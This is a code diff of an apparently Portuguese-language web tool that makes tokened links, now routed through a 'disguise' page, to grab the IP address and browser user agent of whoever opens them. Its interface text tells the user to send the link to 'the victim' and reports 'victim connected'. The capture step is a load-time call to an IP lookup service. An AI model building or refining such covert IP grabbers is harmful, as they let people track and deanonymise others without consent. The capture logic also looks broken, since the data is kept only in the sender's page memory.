@@ -307,26 +307,35 @@ const captureData = {}; // token -> { ips: [], userAgents: [] }
 // Gerar link para captura de IP e dados
 function generateLink() {
   const token = Math.random().toString(36).substring(2, 10);
-  const link = `${location.origin}/app.html?token=${token}`;  // link direto para app.html
+  // Link atualizado para disfarce.html para evitar abrir app nativo
+  const link = `${location.origin}/disfarce.html?token=${token}`;
 
   captureData[token] = { ips: [], userAgents: [] };
 
   const container = document.getElementById('linksList');
   const div = document.createElement('div');
   div.innerHTML = `
-    <strong>Link:</strong> <a href="${link}" target="_blank">${link}</a><br>
+    <strong>Link:</strong> <a href="${link}" target="_blank" rel="noopener noreferrer">${link}</a><br>
+    <button onclick="copyLink('${link}', this)">Copiar Link</button>
     <button onclick="showCapturedData('${token}')">Mostrar Dados Capturados</button>
     <div id="data-${token}" style="margin-top: 5px; font-size: 0.9rem;"></div>
     <hr>
   `;
   container.appendChild(div);
+}
 
-  // Copiar link e mostrar mensagens
+// Copiar link e mostrar mensagem
+function copyLink(link, btn) {
   navigator.clipboard.writeText(link).then(() => {
-    alert('Link copiado! Envie para sua vítima.');
+    btn.textContent = 'Link copiado! Envie para a vítima.';
     setTimeout(() => {
-      alert('Vítima conectada.');
+      btn.textContent = 'Link copiado! Vítima conectada.';
     }, 3000);
+    setTimeout(() => {
+      btn.textContent = 'Copiar Link';
+    }, 6000);
+  }).catch(() => {
+    alert('Erro ao copiar link.');
   });
 }
 
@@ -439,6 +448,32 @@ function clearData() {
   // Limpa dados capturados
   for (const key in captureData) delete captureData[key];
 }
+
+// Captura dados ao acessar link com token
+window.addEventListener('load', () => {
+  const urlParams = new URLSearchParams(window.location.search);
+  const token = urlParams.get('token');
+
+  if (token && captureData[token]) {
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        captureData[token].ips.push(data.ip);
+        captureData[token].userAgents.push(navigator.userAgent);
+
+        // Mostrar botão fechar simples para vítima
+        document.body.innerHTML = `
+          <div style="background:#000; color:#0f0; font-family: monospace; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; text-align: center;">
+            <h2>Dados capturados com sucesso!</h2>
+            <button onclick="window.location.href='about:blank'; window.close();">Fechar</button>
+          </div>
+        `;
+      })
+      .catch(() => {
+        document.body.innerHTML = `<p style="color:#0f0; text-align:center; margin-top: 50px;">Erro ao capturar IP.</p>`;
+      });
+  }
+});
 </script>
 
 </body>
